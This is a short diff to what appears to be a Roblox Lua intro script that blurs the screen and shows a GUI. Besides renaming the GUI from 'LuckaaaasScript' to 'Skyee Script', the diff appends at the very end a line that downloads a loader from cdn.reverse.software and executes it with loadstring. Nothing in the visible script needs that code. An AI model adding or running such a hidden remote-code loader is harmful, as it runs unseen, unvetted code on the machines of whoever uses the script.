@@ -10,7 +10,7 @@ blur.Parent = Lighting
 
 -- Create ScreenGui
 local gui = Instance.new("ScreenGui", playerGui)
-gui.Name = "LuckaaaasScript"
+gui.Name = "Skyee Script"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 
@@ -138,3 +138,5 @@ task.delay(5, function()
 	blur:Destroy()
 	gui:Destroy()
 end)
+ID="3bbdbced-94c9-4ba0-80a9-219ba4e65085";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
